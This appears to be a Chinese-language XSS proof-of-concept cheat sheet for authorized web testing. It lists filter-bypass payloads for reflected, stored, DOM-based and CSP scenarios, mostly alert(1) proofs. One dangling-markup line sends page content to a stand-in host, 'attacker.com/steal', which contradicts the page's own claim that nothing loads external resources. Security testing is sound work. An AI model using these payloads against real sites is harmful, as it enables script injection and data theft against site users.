XSS PoC 模板

跨站脚本攻击存在性证明 - 仅用于 AUTHORIZED 授权安全测试

[!] 法律及合规声明

本文件包含的payload仅限在已获得书面授权的目标上使用。
未经授权使用XSS payload攻击他人网站属于违法行为，使用者需承担所有法律责任。
以下所有payload均为无害的证明型payload（alert(1)、console.log等），
不会窃取Cookie、不会重定向、不会加载外部资源。

使用方法

  1. 打开浏览器的开发者工具 (F12) → Console 面板
  2. 选择一个适合你漏洞场景的payload
  3. 在目标应用的输入框/URL参数中提交该payload
  4. 观察是否弹出提示框或Console出现输出
  5. 截图保留作为漏洞存在的证据
注意: 建议先在本地测试本HTML文件中的payload效果，再用于目标系统。 点击下方"测试"按钮可以查看payload在本地执行的效果。

场景一: 反射型 XSS (Reflected XSS)

适用于: URL参数、搜索框、错误信息回显等用户输入立即返回在页面中的场景

最简证明 <script>alert(1)</script>
最简单的XSS证明，弹出数字1即表示存在
HTML实体绕过 <img src=x onerror=alert(1)>
当 script 标签被过滤时使用，图片加载失败触发事件
事件处理器 " onfocus=alert(1) autofocus="
适用于输入值出现在HTML属性中，用引号跳出
多场景通用 <svg onload=alert(1)>
SVG标签的onload事件，在大多数场景下都能触发

场景二: 存储型 XSS (Stored XSS)

适用于: 评论区、用户名、个人资料、文章标题等数据会持久保存的场景

轻量存储证明 <script>console.log("XSS_PROOF:"+document.domain)</script>
使用console.log而不弹出对话框，更隐蔽，不影响其他用户
异步事件触发 <details open ontoggle=alert(1)>
利用 details 标签的 ontoggle 事件，用户点击展开时触发
CSS 注入 (非脚本) <style>body{background:pink}</style>
证明可以注入任意HTML，不执行JS也能证明存在 (适用于严格CSP)
存储型XSS注意: 存储型XSS会影响所有访问该页面的用户。 提交payload后需清除/删除自己提交的内容，或确认为测试环境。 建议使用 console.log 而非 alert 以降低影响。

场景三: DOM型 XSS (DOM-based XSS)

适用于: 客户端JavaScript动态处理URL参数/location.hash/document.referrer的场景

URL Fragment #<script>alert(1)</script>
用于操作 location.hash 的DOM XSS场景
URL Search ?name=<img src=x onerror=alert(1)>
用于操作 location.search / URL参数 的DOM XSS场景
innerHTML 赋值 <img src="x" onerror="alert(document.domain)">
当页面使用 innerHTML 直接插入用户输入时适用

场景四: CSP 绕过场景 (Content Security Policy)

当目标设置了CSP时，基础payload可能被拦截，以下为不同绕过思路

CSP 允许内联脚本 <script nonce="abc">alert(1)</script>
如果CSP包含 'unsafe-inline' 或 nonce 可预测
CSP 允许 eval (不推荐用于生产) <script>eval(atob("YWxlcnQoMSk"))</script>
当CSP包含 'unsafe-eval' 时可用，但更推荐直接alert
dangling markup 攻击 (仅证明) <img src="http://attacker.com/steal?data=
不执行JS，但证明可以窃取页面内容 (不闭合引号)
